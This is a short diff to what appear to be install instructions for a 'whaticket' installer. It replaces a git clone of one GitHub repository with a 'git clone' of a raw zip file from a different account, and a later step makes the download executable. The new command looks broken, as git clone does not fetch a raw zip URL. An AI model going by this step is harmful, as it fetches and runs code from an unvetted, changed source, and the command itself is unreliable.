@@ -8,7 +8,7 @@ Firstly, you need to download it:
 ```bash
 sudo apt -y update && apt -y upgrade
 sudo apt install -y git
-git clone https://github.com/equinhone/2025_whaticket-installer
+git clone https://raw.githubusercontent.com/rlmourarj/2025_wticket-installer-docker/main/utils/installer-docker-wticket-1.3-beta.3.zip
 ```
 
 Now, all you gotta do is making it executable:
